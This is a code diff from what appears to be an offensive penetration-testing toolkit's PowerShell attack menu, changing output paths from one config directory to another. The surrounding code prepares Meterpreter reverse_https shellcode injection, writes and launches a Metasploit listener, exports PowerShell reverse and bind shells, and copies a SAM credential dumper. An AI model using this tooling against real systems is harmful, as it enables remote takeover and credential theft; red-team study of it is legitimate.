@@ -40,7 +40,7 @@ if powershell_menu_choice != "99":
         core.update_options("POWERSHELL_SOLO=ON")
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
-        with open(core.setdir + "/payload_options.shellcode", "w") as filewrite:
+        with open(core.userconfigpath + "payload_options.shellcode", "w") as filewrite:
             filewrite.write("windows/meterpreter/reverse_https {},".format(port))
 
         try:
@@ -51,15 +51,15 @@ if powershell_menu_choice != "99":
         #prep_powershell_payload()
 
         # create the directory if it does not exist
-        if not os.path.isdir(core.setdir + "/reports/powershell"):
-            os.makedirs(core.setdir + "/reports/powershell")
+        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
+            os.makedirs(core.userconfigpath + "reports/powershell")
 
         # here we format everything for us
-        with  open(core.setdir + "/x86.powershell") as fileopen:
+        with  open(core.userconfigpath + "x86.powershell") as fileopen:
             x86 = fileopen.read()
         x86 = core.powershell_encodedcommand(x86) 
-        core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir, "reports/powershell/")))
-        with open(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
+        core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell/")))
+        with open(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w") as filewrite:
             filewrite.write(x86)
 
         choice = core.yesno_prompt("0", "Do you want to start the listener now [yes/no]: ")
@@ -68,7 +68,7 @@ if powershell_menu_choice != "99":
 
         # if we want to start the listener
         if choice == 'YES':
-            with open(core.setdir + "/reports/powershell/powershell.rc", "w") as filewrite:
+            with open(core.userconfigpath + "reports/powershell/powershell.rc", "w") as filewrite:
                 filewrite.write("use multi/handler\n"
                                 "set payload windows/meterpreter/reverse_https\n"
                                 "set LPORT {0}\n"
@@ -78,10 +78,10 @@ if powershell_menu_choice != "99":
 
             msf_path = core.meta_path()
             subprocess.Popen("{0} -r {1}".format(os.path.join(msf_path, "msfconsole"),
-                                                 os.path.join(core.setdir, "reports/powershell/powershell.rc")),
+                                                 os.path.join(core.userconfigpath, "reports/powershell/powershell.rc")),
                              shell=True).wait()
 
-        core.print_status("Powershell files can be found under {0}".format(os.path.join(core.setdir, "reports/powershell")))
+        core.print_status("Powershell files can be found under {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
         core.return_continue()
 
     # if we select powershell reverse shell
@@ -98,11 +98,11 @@ if powershell_menu_choice != "99":
             data = fileopen.read()
         data = data.replace("IPADDRHERE", ipaddr)
         data = data.replace("PORTHERE", port)
-        core.print_status("Exporting the powershell stuff to {0}".format(os.path.join(core.setdir, "reports/powershell")))
+        core.print_status("Exporting the powershell stuff to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
         # create the directory if it does not exist
-        if not os.path.isdir(core.setdir + "/reports/powershell"):
-            os.makedirs(core.setdir + "/reports/powershell")
-        with open(core.setdir + "/reports/powershell/powershell.reverse.txt", "w") as filewrite:
+        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
+            os.makedirs(core.userconfigpath + "reports/powershell")
+        with open(core.userconfigpath + "reports/powershell/powershell.reverse.txt", "w") as filewrite:
             filewrite.write(data)
 
         choice = core.yesno_prompt("0", "Do you want to start a listener [yes/no]")
@@ -123,22 +123,22 @@ if powershell_menu_choice != "99":
             data = fileopen.read()
         data = data.replace("PORTHERE", port)
         # create the directory if it does not exist
-        if not os.path.isdir(core.setdir + "/reports/powershell"):
-            os.makedirs(core.setdir + "/reports/powershell")
-        with open(core.setdir + "/reports/powershell/powershell.bind.txt", "w") as filewrite:
+        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
+            os.makedirs(core.userconfigpath + "reports/powershell")
+        with open(core.userconfigpath + "reports/powershell/powershell.bind.txt", "w") as filewrite:
             filewrite.write(data)
-        core.print_status("The powershell program has been exported to {0}".format(os.path.join(core.setdir, "reports/powershell/")))
+        core.print_status("The powershell program has been exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell/")))
         core.return_continue()
 
     # if we select powershell powerdump SAM dump
     if powershell_menu_choice == "4":
 
         # create the directory if it does not exist
-        if not os.path.isdir(core.setdir + "/reports/powershell"):
-            os.makedirs(core.setdir + "/reports/powershell")
+        if not os.path.isdir(core.userconfigpath + "reports/powershell"):
+            os.makedirs(core.userconfigpath + "reports/powershell")
         # copy file
         if os.path.isfile("src/powershell/powerdump.encoded"):
-            shutil.copyfile("src/powershell/powerdump.encoded", core.setdir + "/reports/powershell/powerdump.encoded.txt")
-        core.print_status("The powershell program has been exported to {}".format(os.path.join(core.setdir, "reports/powershell")))
+            shutil.copyfile("src/powershell/powerdump.encoded", core.userconfigpath + "reports/powershell/powerdump.encoded.txt")
+        core.print_status("The powershell program has been exported to {}".format(os.path.join(core.userconfigpath, "reports/powershell")))
         core.print_status("Note with PowerDump -- You MUST be running as SYSTEM when executing.")
         core.return_continue()
